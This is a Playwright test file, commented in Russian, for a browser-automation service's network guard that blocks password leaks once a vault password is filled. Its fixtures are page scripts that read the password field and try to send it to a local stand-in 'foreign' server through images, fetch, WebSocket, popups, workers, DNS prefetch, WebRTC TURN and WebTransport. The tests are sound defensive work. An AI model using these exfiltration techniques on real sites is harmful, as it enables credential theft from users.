import { randomBytes } from 'node:crypto'
import { createSocket } from 'node:dgram'
import { mkdtempSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import { createServer as createNetServer, type AddressInfo } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Readable } from 'node:stream'
import { expect, test, type Page } from '@playwright/test'
import { installNetworkGuard } from '../../src/guard/index.js'
import { createProfiles } from '../../src/profiles/index.js'
import { startBrowserService } from '../../src/service/start.js'
import { loginVaultPath, openLoginVault } from '../../src/vault/index.js'
import { refOf, type BrowserResult } from './helpers.js'

// Скрипт на разрешённом сайте читает вписанный пароль и уносит его на чужой сайт запросом GET (картинка, fetch,
// WebSocket). Пока пароль на странице, запросы на сайты вне allowedOrigins закрыты; на новой странице — снова открыты.

const PASSWORD = `exfil-${randomBytes(8).toString('hex')}`

async function listen(server: Server): Promise<string> {
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  return `http://127.0.0.1:${(server.address() as AddressInfo).port}`
}

test('пароль на странице не уходит на чужой сайт ни картинкой, ни fetch, ни WebSocket', async () => {
  const stolen: string[] = []
  const foreign = createServer((request, response) => {
    stolen.push(request.url ?? '')
    response.writeHead(200, { 'content-type': 'image/gif', 'access-control-allow-origin': '*' })
    response.end()
  })
  foreign.on('upgrade', (request, socket) => {
    stolen.push(`ws:${request.url ?? ''}`)
    socket.destroy()
  })
  // Чужой сайт — тот же адрес, но через `localhost`: другой origin.
  const foreignUrl = (await listen(foreign)).replace('127.0.0.1', 'localhost')

  const leakScript = `
    const steal = (value) => {
      new Image().src = '${foreignUrl}/img?p=' + encodeURIComponent(value)
      fetch('${foreignUrl}/fetch?p=' + encodeURIComponent(value), { mode: 'no-cors' }).catch(() => {})
      try { new WebSocket('${foreignUrl.replace('http', 'ws')}/ws?p=' + encodeURIComponent(value)) } catch {}
    }
    document.querySelector('input[type=password]')?.addEventListener('input', (event) => steal(event.target.value))
  `
  const site = createServer((request, response) => {
    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
    if (request.url === '/login') {
      response.end(`<!doctype html><title>Вход</title><label>Пароль <input type="password" name="password"></label><script>${leakScript}</script>`)
    } else {
      response.end(`<!doctype html><title>Кабинет</title><img src="${foreignUrl}/after-login.gif">`)
    }
  })
  const siteUrl = await listen(site)

  const dataDir = mkdtempSync(join(tmpdir(), 'remontnik-browser-exfil-'))
  const vaultKey = randomBytes(32)
  const entry = await openLoginVault({ file: loginVaultPath(dataDir), key: vaultKey }).add({ site: siteUrl, login: 'owner', profile: 'remontnik' }, Readable.from([Buffer.from(PASSWORD)]))
  const logs: string[] = []
  const token = randomBytes(24).toString('hex')
  const service = await startBrowserService({
    token,
    vaultKey,
    dataDir,
    policy: { allowedOrigins: [siteUrl], allowedMutations: [], profiles: [{ name: 'remontnik' }] },
    listen: { host: '127.0.0.1', port: 0 },
    live: null,
    log: (line) => logs.push(line),
  })
  const call = async (command: string, body: Record<string, unknown> = {}): Promise<BrowserResult> => {
    const response = await fetch(`${service.url}/v1/${command}`, {
      method: 'POST',
      headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ profile: 'remontnik', ...body }),
    })
    return (await response.json()) as BrowserResult
  }

  try {
    const login = await call('url', { url: `${siteUrl}/login` })
    expect(login).toMatchObject({ ok: true, title: 'Вход' })
    // Пароль вписан, но страница пыталась унести его: действие сообщает об этом модели, как о любом запросе под замком.
    expect(await call('fill-password', { entryId: entry.id, ref: refOf(login.snapshot, 'textbox', 'Пароль') })).toMatchObject({ ok: false, code: 'refused_leak' })

    await expect.poll(() => logs.filter((line) => line.includes('refused_leak')).length).toBeGreaterThanOrEqual(2)
    // Сокет мог бы прийти чуть позже запросов: ждём, пока страница точно успела попытаться.
    await call('read')
    expect(stolen).toEqual([])

    // Новая страница без пароля: подресурсы с других сайтов снова грузятся.
    expect(await call('url', { url: `${siteUrl}/cabinet` })).toMatchObject({ ok: true, title: 'Кабинет' })
    await expect.poll(() => stolen).toEqual(['/after-login.gif'])
  } finally {
    await service.close()
    site.close()
    foreign.close()
  }
})

test('окно того же сайта не уносит пароль: замок — на весь контекст, пока заперта хоть одна страница', async ({ browser }) => {
  const stolen: string[] = []
  const foreign = createServer((request, response) => {
    stolen.push(request.url ?? '')
    response.writeHead(200, { 'content-type': 'image/gif' })
    response.end()
  })
  const foreignUrl = (await listen(foreign)).replace('127.0.0.1', 'localhost')

  // Новое окно того же сайта читает пароль через opener и уносит его уже от себя.
  const leakScript = `
    document.querySelector('input[type=password]')?.addEventListener('input', () => window.open('/popup', 'reader'))
  `
  const popupScript = `
    const value = window.opener?.document.querySelector('input[type=password]')?.value
    if (value) new Image().src = '${foreignUrl}/opener?p=' + encodeURIComponent(value)
  `
  const site = createServer((request, response) => {
    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
    if (request.url === '/popup') response.end(`<!doctype html><title>Окно</title><script>${popupScript}</script>`)
    else if (request.url === '/cabinet') response.end(`<!doctype html><title>Кабинет</title><img src="${foreignUrl}/after-login.gif">`)
    else response.end(`<!doctype html><title>Вход</title><input type="password" name="password"><script>${leakScript}</script>`)
  })
  const siteUrl = await listen(site)

  // Сам замок, без сервиса: сервис ещё и закрывает новые окна, но не мгновенно — окно успевает сделать запрос.
  const context = await browser.newContext()
  const blocked: string[] = []
  const guard = await installNetworkGuard(context, { allowedOrigins: [siteUrl], allowedMutations: [] }, (request) => blocked.push(request.code))
  try {
    const page = await context.newPage()
    await page.goto(`${siteUrl}/login`)
    guard.passwordFilled(page)
    await page.fill('input[type=password]', PASSWORD)
    await expect.poll(() => context.pages().some((opened) => opened.url().endsWith('/popup'))).toBe(true)
    const reader = context.pages().find((opened) => opened.url().endsWith('/popup'))!
    await reader.waitForLoadState('load')
    await expect.poll(() => blocked.filter((code) => code === 'refused_leak').length).toBeGreaterThanOrEqual(1)

    // Страница с паролем ушла на новый документ, окно живо — замок держится: картинка кабинета и поздний запрос окна закрыты.
    await page.goto(`${siteUrl}/cabinet`)
    await reader.evaluate((url) => void (new Image().src = `${url}/late`), foreignUrl)
    await expect.poll(() => blocked.length).toBeGreaterThanOrEqual(3)
    expect(stolen).toEqual([])

    // Окна закрыты — на новом документе замок снят.
    for (const other of context.pages()) if (other !== page) await other.close()
    await page.goto(`${siteUrl}/cabinet`)
    await expect.poll(() => stolen).toEqual(['/after-login.gif'])
  } finally {
    await context.close()
    site.close()
    foreign.close()
  }
})

// Дальше — настоящий профиль службы (createProfiles): тот же запуск Chromium, флаги и прокси выхода.
async function lockedProfile(siteUrl: string) {
  const profiles = createProfiles({
    dataDir: mkdtempSync(join(tmpdir(), 'remontnik-browser-exfil-')),
    policy: { allowedOrigins: [siteUrl], allowedMutations: [], profiles: [{ name: 'remontnik' }] },
    log: () => {},
  })
  const session = await profiles.get('remontnik')
  return { session, close: () => profiles.closeAll() }
}

/** Выполняет выражение в изолированном мире страницы: скрипты, вставленные в главный мир, его не касаются. */
async function evaluateUnsealed(page: Page, expression: string): Promise<Record<string, string>> {
  const cdp = await page.context().newCDPSession(page)
  const { frameTree } = await cdp.send('Page.getFrameTree')
  const { executionContextId } = await cdp.send('Page.createIsolatedWorld', { frameId: frameTree.frame.id, worldName: 'leak' })
  const { result, exceptionDetails } = await cdp.send('Runtime.evaluate', { expression, contextId: executionContextId, awaitPromise: true, returnByValue: true })
  if (exceptionDetails) throw new Error(exceptionDetails.exception?.description ?? exceptionDetails.text)
  return result.value as Record<string, string>
}

/** Чужой сайт: TCP-сервер видит любое соединение (http, туннель, TURN по TCP), UDP-сервер — любой пакет. */
async function foreignListeners() {
  const tcp: string[] = []
  const tcpServer = createNetServer((socket) => {
    tcp.push('соединение')
    socket.on('data', (chunk) => tcp.push(chunk.toString('latin1').split('\r\n')[0]!))
    socket.on('error', () => {})
  })
  await new Promise<void>((resolve) => tcpServer.listen(0, '127.0.0.1', resolve))
  const udp: number[] = []
  const udpServer = createSocket('udp4')
  udpServer.on('message', (message) => udp.push(message.length))
  await new Promise<void>((resolve) => udpServer.bind(0, '127.0.0.1', resolve))
  return {
    tcp,
    udp,
    tcpPort: (tcpServer.address() as AddressInfo).port,
    udpPort: udpServer.address().port,
    close() {
      tcpServer.close()
      udpServer.close()
    },
  }
}

function loginSite(script = ''): Server {
  return createServer((request, response) => {
    if (request.url === '/nocontent') return void response.writeHead(204).end()
    if (request.url === '/slow') return void setTimeout(() => response.writeHead(200, { 'content-type': 'text/html' }).end('<title>Долго</title>'), 5_000)
    if (request.url === '/download') return void response.writeHead(200, { 'content-type': 'application/octet-stream', 'content-disposition': 'attachment; filename="x.bin"' }).end('x')
    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
    response.end(`<!doctype html><title>Вход</title><input type="password" name="password"><script>${script}</script>`)
  })
}

// Уход без нового документа: адрес страницы меняется, а пароль остаётся в DOM. Замок держится до нового документа.
for (const [label, leave] of [
  ['204 и pushState', `location.href = '/nocontent'`],
  ['stop() и pushState', `location.href = '/slow'; setTimeout(() => window.stop(), 100)`],
  ['скачивание и pushState', `location.href = '/download'`],
] as const) {
  test(`пароль не уходит после ухода без нового документа: ${label}`, async () => {
    const foreign = await foreignListeners()
    const site = loginSite(`
      document.querySelector('input[type=password]')?.addEventListener('input', (event) => {
        const value = event.target.value
        ${leave}
        setTimeout(() => {
          history.pushState({}, '', '/moved')
          new Image().src = 'http://localhost:${foreign.tcpPort}/after?p=' + encodeURIComponent(value)
        }, 1500)
      })
    `)
    const siteUrl = await listen(site)
    const { session, close } = await lockedProfile(siteUrl)
    try {
      await session.page.goto(`${siteUrl}/login`)
      session.passwordFilled()
      await session.page.fill('input[type=password]', PASSWORD)
      const codes: string[] = []
      await expect.poll(() => (codes.push(...session.takeBlocked().map((blocked) => blocked.code)), codes.length + foreign.tcp.length), { timeout: 10_000 }).toBeGreaterThan(0)
      expect(foreign.tcp).toEqual([])
      expect(codes).toContain('refused_leak')
    } finally {
      await close()
      site.close()
      foreign.close()
    }
  })
}

// Каналы мимо перехвата запросов страницы и мимо скриптов в странице: SharedWorker, воркер после подмены
// глобалов страницы, пароль в имени хоста; в изолированном мире — WebRTC (TURN по UDP и TCP с паролем в имени
// пользователя) и WebTransport.
// Ни один байт не должен дойти до чужого адреса, что бы ни сделал скрипт страницы.
test('мимо перехвата пароль не уходит: SharedWorker, подмена глобалов, WebTransport, WebRTC по UDP и TCP, имя хоста', async () => {
  const foreign = await foreignListeners()
  const site = loginSite()
  const siteUrl = await listen(site)
  const { session, close } = await lockedProfile(siteUrl)
  try {
    const page = session.page
    await page.goto(siteUrl)
    session.passwordFilled()
    await page.fill('input[type=password]', PASSWORD)
    const tried = await page.evaluate(
      async ({ tcpPort, udpPort }) => {
        const value = (document.querySelector('input[type=password]') as HTMLInputElement).value
        const foreignHttp = `http://localhost:${tcpPort}`
        const outcome: Record<string, string> = {}
        const fromWorker = (worker: Worker | SharedWorker, label: string) =>
          new Promise<void>((resolve) => {
            const port = 'port' in worker ? worker.port : worker
            port.onmessage = (event: MessageEvent) => {
              outcome[label] = String(event.data)
              resolve()
            }
            setTimeout(() => {
              outcome[label] ??= 'молчит'
              resolve()
            }, 4_000)
          })
        const leak = `
          const value = ${JSON.stringify(value)}
          const send = (result) => (self.postMessage ? self.postMessage(result) : (self.result = result))
          const tries = []
          tries.push(fetch('${foreignHttp}/worker?p=' + value, { mode: 'no-cors' }).then(() => 'fetch ушёл', () => 'fetch закрыт'))
          try {
            const transport = new WebTransport('https://127.0.0.1:${udpPort}/' + value)
            tries.push(transport.ready.then(() => 'webtransport ушёл', () => 'webtransport закрыт'))
          } catch (error) {
            tries.push(Promise.resolve('webtransport нет'))
          }
          const all = Promise.all(tries).then((results) => results.join(', '))
          self.onconnect = (event) => all.then((result) => event.ports[0].postMessage(result))
          all.then((result) => self.postMessage?.(result))
        `
        // SharedWorker: его запросы идут мимо перехвата запросов страницы.
        await fromWorker(new SharedWorker(URL.createObjectURL(new Blob([leak]))), 'shared')
        // Страница портит окружение, которым пользуется скрипт в странице: toString, Blob, createObjectURL.
        const realCreate = URL.createObjectURL
        const direct = realCreate(new Blob([leak]))
        Function.prototype.toString = () => '() => {}'
        URL.createObjectURL = () => direct
        await fromWorker(new Worker(direct), 'worker-подмена')
        URL.createObjectURL = realCreate
        // Пароль в имени хоста: предварительные соединения.
        for (const rel of ['preconnect', 'dns-prefetch']) {
          for (const host of [`${value}.example.test`, `${value}.localhost`, '127.0.0.1']) {
            const link = document.createElement('link')
            link.rel = rel
            link.href = `http://${host}:${tcpPort}`
            document.head.append(link)
          }
        }
        await new Promise((resolve) => setTimeout(resolve, 3_000))
        return outcome
      },
      { tcpPort: foreign.tcpPort, udpPort: foreign.udpPort },
    )
    // Второй слой (скрипт в странице) обойдён: в изолированном мире страницы RTCPeerConnection и WebTransport целы.
    const unsealed = await evaluateUnsealed(
      page,
      `(async () => {
        const value = document.querySelector('input[type=password]').value
        const outcome = {}
        for (const transport of ['udp', 'tcp']) {
          const port = transport === 'udp' ? ${foreign.udpPort} : ${foreign.tcpPort}
          const connection = new RTCPeerConnection({
            iceServers: [{ urls: 'turn:127.0.0.1:' + port + '?transport=' + transport, username: value, credential: value }],
            iceTransportPolicy: 'relay',
          })
          connection.createDataChannel('leak')
          await connection.setLocalDescription(await connection.createOffer())
          outcome['rtc-' + transport] = 'создан'
        }
        const transport = new WebTransport('https://127.0.0.1:${foreign.udpPort}/' + value)
        outcome.webtransport = await Promise.race([
          transport.ready.then(() => 'webtransport ушёл', () => 'webtransport закрыт'),
          new Promise((resolve) => setTimeout(() => resolve('молчит'), 4000)),
        ])
        return outcome
      })()`,
    )
    expect(unsealed['rtc-tcp']).toBe('создан')
    expect({ tcp: foreign.tcp, udp: foreign.udp }).toEqual({ tcp: [], udp: [] })
    // fetch с mode: 'no-cors' «успешен» и на отказ прокси (403): об уходе судим по чужому серверу, а не по нему.
    expect(JSON.stringify({ ...tried, ...unsealed })).not.toContain('webtransport ушёл')
  } finally {
    await close()
    site.close()
    foreign.close()
  }
})
